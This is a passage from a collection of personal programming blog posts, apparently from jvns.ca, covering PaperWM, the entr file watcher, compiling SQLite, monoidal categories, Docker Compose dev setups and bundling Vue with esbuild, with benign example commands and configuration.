windows before but I like the\nsimplicity of it – if I’m looking for a specific window I just move left/right\nuntil I find it. \n\n everything I do in PaperWM \n\n there are lots of other features but these are the only ones I use: \n\n \n move left and right between windows ( Super + , ,  Super + . ) \n move the window left/right in the ordering ( Super+Shift+, ,  Super+Shift+. ) \n full screen a window ( Super + f ) \n make a window smaller ( Super + r ) \n \n\n I like tools that I don’t have to configure \n\n I’ve been using PaperWM for 6 months on a laptop and I really like it! I also\nreally appreciate that even though it’s configurable (by writing a Javascript\nconfiguration file), it does the things I want out of the box without me having to\nresearch how to configure it. \n\n The  fish shell  is\nanother delightful tool like that – I basically don’t configure fish at all\n(except to set environment variables etc) and I really like the default feature\nset. \n\n"},
{"url": "https://jvns.ca/blog/2020/06/28/entr/", "title": "entr: rerun your build when files change", "content": "\n     \n\n This is going to be a pretty quick post  – I found out about  entr  relatively\nrecently and I felt like WHY DID NOBODY TELL ME ABOUT THIS BEFORE?!?! So I’m\ntelling you about it in case you’re in the same boat as I was. \n\n There’s a great explanation of the tool with lots of examples on  entr’s website . \n\n The summary is in the headline:  entr  is a command line tool that lets you run\nan arbitrary command every time you change any of a set of specified files. You\npass it the list of files to watch on stdin, like this: \n\n git ls-files | entr bash my-build-script.sh\n \n\n or \n\n find . -name *.rs | entr cargo test\n \n\n or whatever you want really. \n\n quick feedback is amazing \n\n Like possibly every single programmer in the universe, I find it Very Annoying\nto have to manually rerun my build / tests every time I make a change to my\ncode. \n\n A lot of tools (like hugo and flask) have a built in system to automatically\nrebuild when you change your files, which is great! \n\n But often I have some hacked together custom build process that I wrote myself\n(like  bash build.sh ), and  entr  lets me have a magical build experience\nwhere I get instant feedback on whether my change fixed the weird bug with just\none line of bash. Hooray! \n\n restart a server ( entr -r ) \n\n Okay, but what if you’re running a server, and the server needs to be restarted\nevery time you change a file? entr’s got you – if you pass  -r , then \n\n git ls-files | entr -r python my-server.py\n \n\n clear the screen ( entr -c ) \n\n Another neat flag is  -c , which lets you clear the screen before rerunning the\ncommand, so that you don’t get distracted/confused by the previous build’s\noutput. \n\n use it with  git ls-files \n\n Usually the set of files I want to track is about the same list of files I have\nin git, so  git ls-files  is a natural thing to pipe to  entr . \n\n I have a project right now where sometimes I have files that I’ve just created\nthat aren’t in git just yet. So what if you want to include untracked files?\nThese git command line arguments will do it (I got them from an email from a reader, thank you!): \n\n git ls-files -cdmo --exclude-standard  | entr your-build-script\n \n\n Someone emailed me and said they have a  git-entr  command that runs \n\n git ls-files -cdmo --exclude-standard | entr -d \"$@\"\n \n\n which I think is a great idea. \n\n restart every time a new file is added:  entr -d \n\n The other problem with this  git ls-files  thing is that sometimes I add a new\nfile, and of course it’s not in git yet. entr has a nice feature for this – if\nyou pass  -d , then if you add a new file in any of the directories entr is\ntracking, then it’ll exit. \n\n I’m using this paired with a little while loop that will restart\n entr  to include the new files, like this: \n\n while true\ndo\n{ git ls-files; git ls-files . --exclude-standard --others; } | entr -d your-build-script\ndone\n \n\n how entr works on Linux: inotify \n\n On Linux, entr works using  inotify  (a system for tracking filesystem events\nlike file changes) –  if you strace it, you’ll see an  inotify_add_watch \nsystem call for each file you ask it to watch, like this: \n\n inotify_add_watch(3, \"static/stylesheets/screen.css\", IN_ATTRIB|IN_CLOSE_WRITE|IN_CREATE|IN_DELETE_SELF|IN_MOVE_SELF) = 1152\n \n\n that’s all! \n\n I hope this helps a few people learn about  entr ! \n\n"},
{"url": "https://jvns.ca/blog/2019/10/28/sqlite-is-really-easy-to-compile/", "title": "SQLite is really easy to compile", "content": "\n     \n\n In the last week I’ve been working on another SQL website\n( https://sql-steps.wizardzines.com/ , a list of SQL examples). I’m running all\nthe queries on that site with sqlite, and I wanted to use window functions in\none of the examples ( this one ). \n\n But I’m using the version of sqlite from Ubuntu 18.04, and that version is too\nold and doesn’t support window functions. So I needed to upgrade sqlite! \n\n This turned to out be surprisingly annoying (as usual), but in a pretty\ninteresting way! I was reminded of some things about how executables and shared\nlibraries work and it had a very satisfying conclusion. So I wanted to write it up here. \n\n (spoiler: the summary is that  https://www.sqlite.org/howtocompile.html  explains\nhow to compile SQLite and it takes like 5 seconds to do and it’s 20x easier\nthan my usual experiences compiling software from source) \n\n attempt 1: download a SQLite binary from their website \n\n The  SQLite download page  has a link to\na Linux binary for the SQLite command line tool. I downloaded it, it worked on\nmy laptop, and I thought I was done. \n\n But then I tried to run it on a build server I was using (Netlify), and I got\nthis extremely strange error message: “File not found”. I straced it, and sure\nenough  execve  was returning the error code ENOENT, which means “File not\nfound”. This was kind of maddening because the file was DEFINITELY there and it\nhad the correct permissions and everything. \n\n I googled this problem (by searching “execve enoent”), found  this stack overflow answer ,\nwhich pointed out that to run a binary, you don’t just need the binary to exist! You also need its  loader  to exist. (the path to the loader is inside the binary) \n\n To see the path for the loader you can use  ldd , like this: \n\n $ ldd sqlite3\n\tlinux-gate.so.1 (0xf7f9d000)\n\tlibdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xf7f70000)\n\tlibm.so.6 => /lib/i386-linux-gnu/libm.so.6 (0xf7e6e000)\n\tlibz.so.1 => /lib/i386-linux-gnu/libz.so.1 (0xf7e4f000)\n\tlibc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c73000)\n\t/lib/ld-linux.so.2\n \n\n So  /lib/ld-linux.so.2  is the loader,and that file doesn’t exist on the build\nserver, probably because that Xenial installation didn’t have support for\n32-bit binaries (?), and I needed to try something different. \n\n attempt 2: install the Debian sqlite3 package \n\n Okay, I thought, maybe I can install the  sqlite package from debian\ntesting . Trying\nto install a package from a different Debian version that I’m not using is\nliterally never a good idea, but for some reason I decided to try it anyway. \n\n Doing this completely unsurprisingly broke the sqlite installation on my\ncomputer (which also broke git), but I managed to recover from that with a\nbunch of  sudo dpkg --purge --force-all libsqlite3-0  and make everything that\ndepended on sqlite work again. \n\n attempt 3: extract the Debian sqlite3 package \n\n I also briefly tried to just extract the sqlite3 binary from the Debian sqlite\npackage and run it. Unsurprisingly, this also didn’t work, but in a more\nunderstandable way: I had an older version of libreadline (.so.7) and it wanted\n.so.8. \n\n $ ./usr/bin/sqlite3\n./usr/bin/sqlite3: error while loading shared libraries: libreadline.so.8: cannot open shared object file: No such file or directory\n \n\n attempt 4: compile it from source \n\n The whole reason I spent all this time trying to download sqlite binaries is\nthat I assumed it would be annoying or time consuming to compile sqlite from\nsource. But obviously downloading random sqlite binaries was not working for me\nat all, so I finally decided to try to compile it myself. \n\n Here are the directions:  How to compile\nSQLite . And they’re the EASIEST\nTHING IN THE UNIVERSE. Often compiling things feels like this: \n\n \n run  ./configure \n realize i’m missing a dependency \n run  ./configure  again \n run  make \n the compiler fails because actually i have the wrong version of some dependency \n go do something else and try to find a binary \n \n\n Compiling SQLite works like this: \n\n \n download an  amalgamation tarball from the download page \n run  gcc shell.c sqlite3.c -lpthread -ldl \n that’s it!!! \n \n\n All the code is in one file ( sqlite.c ), and there are no weird dependencies! It’s amazing. \n\n For my specific use case I didn’t actually need threading support or readline\nsupport or anything, so I used the instructions on the compile page to create a\nvery simple binary that only used libc and no other shared libraries. \n\n $ ldd sqlite3\n\tlinux-vdso.so.1 (0x00007ffe8e7e9000)\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbea4988000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007fbea4d79000)\n \n\n this is nice because it makes it easy to experiment with sqlite \n\n I think it’s cool that SQLite’s build process is so simple because in the past\nI’ve had fun  editing sqlite’s source code  to\nunderstand how its btree implementation works. \n\n This isn’t really super surprising given what I know about SQLite (it’s made to\nwork really well in restricted / embedded contexts, so it makes sense that it\nwould be possible to compile it in a really simple/minimal way). But it is\nsuper nice! \n\n"},
{"url": "https://jvns.ca/blog/2019/03/26/what-are-monoidal-categories/", "title": "Why are monoidal categories interesting?", "content": "\n     \n\n Hello! Someone on Twitter asked a question about tensor categories recently and I remembered “oh,\nI know something about that!! These are a cool thing!“. Monoidal categories are also called “tensor\ncategories” and I think that term feels a little more concrete: one of the biggest examples of a\ntensor category is the category of vector spaces with the tensor product as the way you combine\nvectors / functions. “Monoidal” means “has an associative binary operation with an identity”, and with\nvector spaces the tensor product is the “associative binary operation” it’s referring to. So I’m\ngoing to mostly use “tensor categories” in this post instead. \n\n So here’s a quick stab at explaining why tensor categories are cool. I’m going to make a lot of\noversimplifications which I figure is better than trying to explain category theory from the ground\nup. I’m not a category theorist (though I spent 2 years in grad school doing a bunch of category\ntheory) and I will almost certainly say wrong things about category theory. \n\n In this post I’m going to try to talk about  Seven Sketches in Compositionality: An Invitation to\nApplied Category Theory  using mostly plain English. \n\n tensor categories aren’t monads \n\n If you have been around functional programming for a bit, you might see the word “monoid” and\n“categories” and wonder “oh, is julia writing about monads, like in Haskell”? I am not!! \n\n There is a sentence “monads are a monoid in the category of endofunctors” which includes both the\nword “monoid” and “category” but that is not what I am talking about at all. We’re not going to talk\nabout types or Haskell or monads or anything. \n\n tensor categories are about proving (or defining) things with pictures \n\n Here’s what I think is a really nice example from this [“seven sketches in compositionality”](( https://arxiv.org/pdf/1803.05316.pdf ) PDF (on\npage 47): \n\n \n\n The idea here is that you have 3 inequalities \n\n \n t <= v + w \n w + u <= x + z \n v + x <= y , \n \n\n and you want to prove that  t + u <= y + z . \n\n You can do this algebraically pretty easily. \n\n But in this diagram they’ve done something really different! They’ve sort of drawn the inequalities\nas boxes with lines coming out of them for each variable, and then you can see that you end up with\na  t  and a  u  on the left and a  y  and a  z  on the right, and so maybe that means that  t + u <= y + z . \n\n The first time I saw something like this in a math class I felt like – what? what is happening? you\ncan’t just draw PICTURES to prove things?!! And of course you can’t  just  draw pictures to prove\nthings. \n\n What’s actually happening in pictures like this is that when you put 2 things next to each other in\nthe picture (like  t  and  u ), that actually represents the “tensor product” of  t  and  u . In\nthis case the “tensor product” is defined to be addition. And the tensor product (addition in this case) has\nsome special properties – \n\n \n it’s associative \n if  a <= b  and  c <= d  then  a + c <= b + d \n \n\n so saying that this picture proves that  t + u <= y + z   actually  means that you can read a\nproof off the diagram in a straightforward way: \n\n       t    + u \n<= (v + w) + u \n=  v + (w + u) \n<= v + (x + z) \n=  (v + x) + z \n<=   y     + z\n \n\n So all the things that “look like they would work” according to the picture actually do work in\npractice because our tensor product thing is associative and because addition works nicely with the\n <=  relationship. The book explains all this in a lot more detail. \n\n draw vector spaces with “string diagrams” \n\n Proving this simple inequality is kind of boring though! We want to do something more interesting,\nso let’s talk about vector spaces! Here’s a diagram that includes some vector spaces (U1, U2, V1, V2)\nand some functions (f,g) between them. \n\n \n\n Again, here what it means to have U1 stacked on top of U2 is that we’re taking a tensor product of\nU1 and U2. And the tensor product is associative, so there’s no ambiguity if we stack 3 or 4 vector\nspaces together! \n\n This is all explained in a lot more detail in this nice blog post called  introduction to string diagrams  (which I took that picture from). \n\n define the trace of a matrix with a picture \n\n So far this is pretty boring! But in a  follow up blog\npost , they talk about\nsomething more outrageous: you can (using vector space duality) take the lines in one of these diagrams and move them\n backwards  and make loops. So that lets us define the trace of a function  f : V -> V  like this: \n\n \n\n This is a really outrageous thing! We’ve said, hey, we have a function and we want to get a number\nin return right? Okay, let’s just… draw a circle around it so that there are no lines left coming\nout of it, and then that will be a number! That seems a lot more natural and prettier than the usual\nway of defining the trace of a matrix (“sum up the numbers on the diagonal”)! \n\n When I first saw this I thought it was super cool that just drawing a circle is actually a\nlegitimate way of defining a mathematical concept! \n\n how are tensor category diagrams different from regular category theory diagrams? \n\n If you see “tensor categories let you prove things with pictures” you might think “well, the whole\npoint of category theory is to prove things with pictures, so what?“. I think there are a few things\nthat are different in tensor category diagrams: \n\n \n with string diagrams, the lines are objects and the boxes are functions which is the opposite of\nhow usual category theory diagrams are \n putting things next to each other in the diagram has a specific meaning (“take the tensor product\nof those 2 things”) where as in usual category theory diagrams it doesn’t. being able to combine\nthings in this way is powerful! \n half circles have a specific meaning (“take the dual”) \n you can use specific elements of a vector space in a diagram which usually you wouldn’t do\nin a category theory diagram (the objects would be the whole vector space, not one element of\nthat vector space) \n \n\n what does this have to do with programming? \n\n Even though this is usually a programming blog I don’t know whether this particular thing really has\nanything to do with programming, I just remembered I thought it was cool.\nI wrote my  master’s\nthesis  (which i will link to even\nthough it’s not very readable) on topological quantum computing which involves a bunch of monoidal\ncategories. \n\n Some of the diagrams in this post are sort of why I got interested in that area in the first place\n– I thought it was really cool that you could formally define / prove things with pictures. And\nuseful things, like the trace of a matrix! \n\n edit: some ways this might be related to programming \n\n Someone pointed me to a couple of twitter threads (coincidentally from this week!!) that relate\ntensor categories & diagrammatic methods to programming: \n\n \n this thread from @KenScambler  (“My best kept secret* is that string & wiring diagrams–plucked straight out of applied category theory–are  fabulous  for software and system design.) \n this other thread by him of 31 interesting related things to this topic \n \n\n"},
{"url": "https://jvns.ca/blog/2021/01/04/docker-compose-is-nice/", "title": "Docker Compose: a nice way to set up a dev environment", "content": "\n     \n\n Hello! Here is another post about  computer tools that I’ve appreciated . This one is about Docker Compose! \n\n This post is mostly just about how delighted I was that it does what it’s\nsupposed to do and it seems to work and to be pretty straightforward to use.\nI’m also only talking about using Docker Compose for a dev environment here, not using it in production. \n\n I’ve been thinking about this kind of personal dev environment setup more\nrecently because I now do all my computing with a personal cloud budget of like\n$20/month instead of spending my time at work thinking about how to manage\nthousands of AWS servers. \n\n I’m very happy about this because previous to trying Docker Compose I spent\ntwo days getting frustrated with trying to set up a dev environment with other\ntools and Docker Compose was a lot easier and simpler. And then I told my\nsister about my docker-compose experiences and she was like “I KNOW, DOCKER\nCOMPOSE IS GREAT RIGHT?!?!” So I thought I’d write a blog post about it, and\nhere we are. \n\n the problem: setting up a dev environment \n\n Right now I’m working on a Ruby on Rails service (the backend for a sort of\ncomputer debugging game). On my production server, I have: \n\n \n a nginx proxy \n a Rails server \n a Go server (which proxies some SSH connections with  gotty ) \n a Postgres database \n \n\n Setting up the Rails server locally was pretty straightforward without\nresorting to containers (I just had to install Postgres and Ruby, fine, no big deal), but then\nI wanted send  /proxy/*  to the Go server and everything else to the Rails\nserver, so I needed nginx too. And installing nginx on my laptop felt too messy\nto me. \n\n So enter  docker-compose ! \n\n docker-compose lets you run a bunch of Docker containers \n\n Docker Compose basically lets you run a bunch of Docker containers that can communicate with each other. \n\n You configure all your containers in one file called  docker-compose.yml . I’ve\npasted my entire  docker-compose.yml  file here for my server because I found\nit to be really short and straightforward. \n\n version: \"3.3\"\nservices:\n  db:\n    image: postgres\n    volumes:\n      - ./tmp/db:/var/lib/postgresql/data\n    environment:\n      POSTGRES_PASSWORD: password # yes I set the password to 'password'\n  go_server:\n    # todo: use a smaller image at some point, we don't need all of ubuntu to run a static go binary\n    image: ubuntu\n    command: /app/go_proxy/server\n    volumes:\n      - .:/app\n  rails_server:\n    build: docker/rails\n    command: bash -c \"rm -f tmp/pids/server.pid && source secrets.sh && bundle exec rails s -p 3000 -b '0.0.0.0'\"\n    volumes:\n      - .:/app\n  web:\n    build: docker/nginx\n    ports:\n      - \"8777:80\" # this exposes port 8777 on my laptop\n \n\n There are two kinds of containers here: for some of them I’m just\nusing an existing image ( image: postgres  and  image: ubuntu ) without\nmodifying it at all. And for some I needed to build a custom container image –\n build: docker/rails  says to use  docker/rails/Dockerfile  to build a custom\ncontainer. \n\n I needed to give my Rails server access to some API keys and things, so  source secrets.sh  puts a bunch of secrets in environment variables.  Maybe there’s a\nbetter way to manage secrets but it’s just me so this seemed fine. \n\n how to start everything:  docker-compose build  then  docker-compose up \n\n I’ve been starting my containers just by running  docker-compose build  to\nbuild the containers, then   docker-compose up  to run everything. \n\n You can set  depends_on  in the yaml file to get a little more control over\nwhen things start in, but for my set of services the start order\ndoesn’t matter, so I haven’t. \n\n the networking is easy to use \n\n It’s important here that the containers be able to connect to each other.\nDocker Compose makes that super simple! If I have a Rails server running in my\n rails_server  container on port 3000, then I can access that with\n http://rails_server:3000 . So simple! \n\n Here’s a snippet from my nginx configuration file with how I’m using that in\npractice (I removed a bunch of  proxy_set_header  lines to make it more clear) \n\n location ~ /proxy.* {\n    proxy_pass http://go_server:8080;\n}\nlocation @app {\n    proxy_pass http://rails_server:3000;\n}\n \n\n Or here’s a snippet from my Rails project’s database configuration, where I use the name of the database container ( db ): \n\n development:\n  <<: *default\n  database: myproject_development\n  host: db # <-------- this \"magically\" resolves to the database container's IP address\n  username: postgres\n  password: password\n \n\n I got a bit curious about how  rails_server  was actually getting resolved to\nan IP address. It seems like Docker is running a DNS server somewhere on my\ncomputer to resolve these names. Here are some DNS queries where we can see that each container has its own IP address: \n\n $ dig +short @127.0.0.11 rails_server\n172.18.0.2\n$ dig +short @127.0.0.11 db\n172.18.0.3\n$ dig +short @127.0.0.11 web\n172.18.0.4\n$ dig +short @127.0.0.11 go_server\n172.18.0.5\n \n\n who’s running this DNS server? \n\n I dug into how this DNS server is set up a very tiny bit. \n\n I ran all these commands outside the container, because I didn’t have a lot of\nnetworking tools installed in the container. \n\n step 1 : find the PID of my Rails server with  ps aux | grep puma \n\n It’s 1837916. Cool. \n\n step 2 : find a UDP server running in the same network namespace as PID  1837916 \n\n I did this by using  nsenter  to run  netstat  in the same network namespace as\nthe  puma  process. (technically I guess you could run  netstat -tupn  to just\nshow UDP servers, but my fingers only know how to type  netstat -tulpn  at this\npoint) \n\n $ sudo nsenter -n -t 1837916 netstat -tulpn\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.11:32847        0.0.0.0:*               LISTEN      1333/dockerd        \ntcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      1837916/puma 4.3.7  \nudp        0      0 127.0.0.11:59426        0.0.0.0:*                           1333/dockerd  \n \n\n So there’s a UDP server running on port  59426 , run by  dockerd ! Maybe that’s the DNS server? \n\n step 3 : check that it’s a DNS server \n\n We can use  dig  to make a DNS query to it: \n\n $ sudo nsenter -n -t 1837916 dig +short @127.0.0.11 59426 rails_server\n172.18.0.2\n \n\n But – when we ran  dig  earlier, we weren’t making a DNS query to port 59426,\nwe were querying port 53! What’s going on? \n\n step 4 : iptables \n\n My first guess for “this server seems to be running on port X but I’m accessing it on port Y, what’s going on?” was “iptables”. \n\n So I ran iptables-save in the container’s network namespace, and there we go: \n\n $ sudo nsenter -n -t 1837916 iptables-save\n.... redacted a bunch of output ....\n-A DOCKER_POSTROUTING -s 127.0.0.11/32 -p udp -m udp --sport 59426 -j SNAT --to-source :53\nCOMMIT\n \n\n There’s an iptables rule that sends traffic on port 53 to 59426. Fun! \n\n it stores the database files in a temp directory \n\n One nice thing about this is: instead of managing a Postgres installation on my\nlaptop, I can just mount the Postgres container’s data directory at  ./tmp/db . \n\n I like this because I really do not want to administer a Postgres installation\non my laptop (I don’t really know how to configure Postgres), and conceptually\nI like having my dev database literally be in the same directory as the rest of my code. \n\n I can access the Rails console with  docker-compose exec rails_server rails console \n\n Managing Ruby versions is always a little tricky and even when I have it\nworking, I always kind of worry I’m going to screw up my Ruby installation and\nhave to spend like ten years fixing it. \n\n With this setup, if I need access to the Rails console (a REPL with all my Rails code loaded), I can just run: \n\n $ docker-compose exec rails_server rails console\nRunning via Spring preloader in process 597\nLoading development environment (Rails 6.0.3.4)\nirb(main):001:0> \n \n\n Nice! \n\n small problem: no history in my Rails console \n\n I ran into a problem though: I didn’t have any history in my Rails console\nanymore, because I was restarting the container all the time. \n\n I figured out a pretty simple solution to this though:  I added a\n /root/.irbrc  to my container that changed the IRB history file’s location to\nbe something that would persist between container restarts. It’s just one line: \n\n IRB.conf[:HISTORY_FILE] = \"/app/tmp/irb_history\"\n \n\n I still don’t know how well it works in production \n\n Right now my production setup for this project is still “I made a digitalocean\ndroplet and edited a lot of files by hand”. \n\n I think I’ll try to use docker-compose to run this thing in production.\nMy guess is that it should work fine because this service is probably going to\nhave at most like 2 users at a time and I can easily afford to have 60 seconds\nof downtime during a deploy if I want, but usually something goes wrong that I\nhaven’t thought of. \n\n A few notes from folks on Twitter about docker-compose in production: \n\n \n docker-compose up  will only restart the containers that need restarting, which makes restarts faster \n there’s a small bash script  wait-for-it  that you can use to make a container wait for another service to be available \n You can have 2 docker-compose.yaml files:  docker-compose.yaml  for DEV, and  docker-compose-prod.yaml  for prod. I think I’ll use this to expose different nginx ports: 8999 in dev and 80 in prod. \n folks seemed to agree that docker-compose is fine in production if you have a small website running on 1 computer \n one person suggested that Docker Swarm might be better for a slightly more complicated production setup, but I haven’t tried that (or of course Kubernetes, but the whole point of Docker Compose is that it’s super simple and Kubernetes is certainly not simple :) ) \n \n\n Docker also seems to have a feature to  automatically deploy your docker-compose setup to ECS ,\nwhich sounds cool in theory but I haven’t tried it. \n\n when doesn’t docker-compose work well? \n\n I’ve heard that docker-compose doesn’t work well: \n\n \n when you have a very large number of microservices (a simple setup is\nbest) \n when you’re trying to include data from a very large database (like putting\nhundreds of gigabytes of data on everyone’s laptop) \n on Mac computers, I’ve heard that Docker can be a lot slower than on Linux\n(presumably because of the extra VM). I don’t have a Mac so I haven’t run\ninto this. \n \n\n that’s all! \n\n I spent an entire day before this trying to configure a dev environment by\nusing Puppet to provision a Vagrant virtual machine only to realize that VMs\nare kind of slow to start and that I don’t really like writing Puppet\nconfiguration (I know, huge surprise :)). \n\n So it was nice to try Docker Compose and find that it was straightforward to\nget to work! \n\n"},
{"url": "https://jvns.ca/blog/2021/11/15/esbuild-vue/", "title": "Some notes on using esbuild", "content": "\n     \n\n Hello! \n\n I’ve been writing more frontend code in the last year or two – I’ve been making a bunch of little Vue projects. (for example  nginx playground ,  sql playground ,  this dns lookup tool , and a couple of others) \n\n My general approach to frontend development has been pretty “pretend it’s 2005” – I usually\nhave an  index.html  file, a  script.js  file, and then I do a  <script\nsrc=\"script.js\">  and that’s it. You can see an  example of that approach here . \n\n This has been working mostly ok for me, but sometimes I run into problems. So I\nwanted to talk about one of those problems, a solution I found\n( esbuild !), and what I needed to learn to solve the problem (some very basic facts about how npm builds work). \n\n Some of the facts in this post might\nbe wrong because still I don’t understand Javascript build systems that well. \n\n problem 1: libraries that tell you to  npm install  them \n\n Sometimes I see Javascript libraries that I’m interested in using, and they\nhave installation instructions like this: \n\n npm install vue-jcrop\n \n\n and code examples to use the library that look like this: \n\n import { Jcrop } from 'vue-jcrop';\n \n\n Until last week, I found this completely mystifying – I had no idea what\n import  was doing and I didn’t understand how to use libraries in that way. \n\n I still don’t totally understand but I understand a tiny\nbit more now and I will try to explain what I’ve learned. \n\n problem 2: I don’t understand frontend build tools \n\n Of course, the obvious way to solve problem 1 is to use Vue.js the “normal”\nway where I install it with  npm  and use Vite or  vue-cli-service  or\nwhatever. \n\n I’ve used those tools before once or twice – there’s this project generator\ncalled  vue create  which will set up everything for you properly, and it\ntotally works. \n\n But I stopped using those tools and went back to my old  <script\nsrc=\"script.js\">  system because I don’t understand what those\n vue-cli-service  and  vite  are doing and I didn’t feel confident that I could\nfix them when they break. So I’d rather stick to a setup that I actually\nunderstand. \n\n I think the reason  vue-cli-service  is so confusing to me is that it’s\nactually doing many different things – I think it: \n\n \n compiles Vue templates \n runs Babel (??) \n does type checking for Typescript (if you’re using typescript) \n does all of the above with webpack which I will not try to explain much\nbecause I don’t understand it, I think it’s a system with a million plugins\nthat does a million things \n probably some other things I’m forgetting or don’t even know about \n \n\n If I were working on a big frontend project I’d probably use those tools\nwhether or not I understood them because they do useful things. But I haven’t been using them. \n\n esbuild: a simple way to resolve  import s \n\n Okay! Let’s get to the point of the post! \n\n Recently I learned about  esbuild  which is a new JS build tool written in Go. I’m excited\nabout it because it lets me use  import s in my code without using a giant build\npipeline that I don’t understand. I’m also used to the style\nof command-line tools written in Go so it feels more “natural” to me than other tools written in Javascript do. \n\n Basically  esbuild  can resolve all the imports and then bundle everything into 1 big file. \n\n So let’s say I want to use  vue  in my library. I can get it working by doing these 4 steps: \n\n step 1: install the library I want \n\n npm install vue  or whatever. \n\n step 2: import it in script.js \n\n import Vue from 'vue';\n \n\n step 3: run  esbuild  to bundle it \n\n $ esbuild script.js  --bundle --minify  --outfile=bundle.js\n \n\n step 4: add a  <script src='bundle.js'> ; \n\n Then I need to replace all of my script tags with just one script ( <script src=\"bundle.js\"> ) in my HTML, and everything should just work, right? \n\n This all seemed very simple and I was super excited about this, but… \n\n problem 3: it didn’t work \n\n I was really excited about this, but when I tried it\n( import Vue from 'vue' ), it didn’t work! I was really baffled by this, but I was eventually able to figure it out with some help from people who understood Javascript.\n(spoiler: it wasn’t esbuild’s fault!) \n\n To understand why my  import  didn’t work, I needed to learn a little bit more\nabout how frontend packaging works. So let’s talk about that. \n\n First, I was getting this error message in the JS console (which of course I didn’t see until the 20th time I looked at the console) \n\n \n [Vue warn]: You are using the runtime-only build of Vue where the template compiler is not available. Either pre-compile the templates into render functions, or use the compiler-included build. \n \n\n This was bad, because I was compiling my Vue templates at runtime, so I\ndefinitely needed the template compiler. So I just needed to convince  esbuild \nto give me the version of Vue with the template compiler. But how? \n\n frontend libraries can have many different build artifacts \n\n Apparently frontend libraries often have many different\nbuild artifacts! For example, here are all of the different Vue build\nartifacts I have on my computer, excluding the minified versions: \n\n $ ls node_modules/vue/dist | grep -v min\nREADME.md\nvue.common.dev.js\nvue.common.js\nvue.common.prod.js\nvue.esm.browser.js\nvue.esm.js\nvue.js\nvue.runtime.common.dev.js\nvue.runtime.common.js\nvue.runtime.common.prod.js\nvue.runtime.esm.js\nvue.runtime.js\n \n\n I think the different options being expressed here are: \n\n \n dev vs prod (how verbose are the error messages?) \n runtime vs not-runtime (does it include a template compiler?) \n whatever the difference between  vue.js  vs  vue.esm.js  vs  vue.common.js  is (something about ES6 modules vs CommonJS???) \n \n\n how the build artifact usually gets chosen: webpack or something \n\n I think the way Vue.js usually chooses which Vue version  import  uses is through a config file called  vue.config.ts \n\n As far as I can tell, this usually gets processed through some code  in this file  that looks like this: \n\n       webpackConfig.resolve\n        .alias\n          .set(\n            'vue$',\n            options.runtimeCompiler\n              ? 'vue/dist/vue.esm.js'\n              : 'vue/dist/vue.runtime.esm.js'\n          )\n \n\n Even though I have no idea how Webpack works, this is pretty helpful! It’s\nsaying that if I want the runtime compiler, I need to use  vue.esm.js \nintead of  vue.runtime.esm.js .  I can do that! \n\n what build artifact is esbuild loading? \n\n I also double checked which version of  Vue  esbuild is loading using strace, because I love strace: \n\n I made a file called  blah.js  that looks like this: \n\n import Vue from 'vue';\n\nconst app = new Vue()\n \n\n and saw which files it opened, like this: (you have to scroll right to see the filenames) \n\n $ strace -e openat -f  esbuild blah.js  --bundle --outfile=/dev/null\nopenat(AT_FDCWD, \"/home/bork/work/mess-with-dns/frontend/package.json\", O_RDONLY|O_CLOEXEC) = 3\nopenat(AT_FDCWD, \"/home/bork/work/mess-with-dns/frontend/blah.js\", O_RDONLY|O_CLOEXEC) = 3\nopenat(AT_FDCWD, \"/home/bork/work/mess-with-dns/frontend/node_modules/vue/package.json\", O_RDONLY|O_CLOEXEC) = 3\nopenat(AT_FDCWD, \"/home/bork/work/mess-with-dns/frontend/node_modules/vue/dist/vue.runtime.esm.js\", O_RDONLY|O_CLOEXEC) = 3\n \n\n It looks like it just opens  package.json  and  vue.runtime.esm.js .  package.json  has this  main  key, which must be what’s directing esbuild to\nload  vue.runtime.esm.js . I guess that’s part of the ES6 modules spec or\nsomething. \n\n   \"main\": \"dist/vue.runtime.common.js\",\n \n\n importing the template compiler version of Vue fixed everything \n\n Importing the version of Vue with the template compiler was very simple in the end, I just needed to do \n\n import Vue from 'vue/dist/vue.esm.js'\n \n\n instead of \n\n import Vue from 'vue'\n \n\n and then  esbuild  worked! Hooray! Now I can just put that  esbuild \nincantation in a bash script which is how I run all my builds for tiny projects\nlike this. \n\n npm install  gives you all the build artifacts \n\n This is a simple thing but I didn’t really understand it before – it seems like  npm install vue : \n\n \n the package maintainer runs  npm run build  at some point and then publishes the package to the NPM registry \n npm install  downloads the Vue source into  node_modules , as well as the build artifacts \n \n\n I think that’s right? \n\n npm run build  can run any arbitrary program, but the convention seems to be\nfor it to create build artifacts that end up in  node_modules/vue/dist . Maybe\nthe  dist  folder is standardized by npm somehow? I’m not sure. \n\n not every NPM package has a  dist/  directory \n\n There’s a cool NPM package called  friendly-words  from Glitch. If I run\n npm install friendly-words , it doesn’t have a  dist/  directory. \n\n It was explained to me that this is because this a package intended to be run\non the  backend , so it doesn’t package itself into a single Javascript file\nbuild artifact in the same way. Instead it just loads files from disk at\nruntime – this is basically what it does: \n\n $ cat node_modules/friendly-words/index.js \nconst data = require('./generated/words.json');\n\nexports.objects = data.objects;\nexports.predicates = data.predicates;\nexports.teams = data.teams;\nexports.collections = data.collections;\n \n\n people seem to prefer  import  over  require  for frontend code \n\n Here’s what I’ve understood about  import  vs  require  so far: \n\n \n there are two ways to use  import  /  require , you can do a build step to collapse all the imports and put everything into one file (which is what I’m doing), or you can do the imports/requires at runtime \n browsers can’t do  require  at runtime, only  import . This is because  require  loads the code synchronously \n there are 2 standards (CommonJS and ES6 modules), and that  require  is CommonJS and  import  is ES6 modules. \n import  seems to be a lot more restricted than  require  in general (which is good) \n \n\n I think this means that I should use  import  and not  require  in my frontend code. \n\n it’s exciting to be able to do imports \n\n I’m pretty excited to be able to do imports in a way that I actually almost\nunderstand for the first time. I don’t think it’s going to make  that  big of a\ndifference to my projects (they’re still very small!). \n\n I don’t understand everything\n esbuild  is doing, but it feels a lot more approachable and transparent than\nthe Webpack-based tools that I’ve used previously. \n\n The other thing I like about  esbuild  is that it’s a static Go binary, so I\nfeel more confident that I’ll be able to get it to work in the future than with\ntool written in Javascript, just because I understand the Javascript ecosystem\nso poorly. And it’s super fast, which is great. \n\n"},
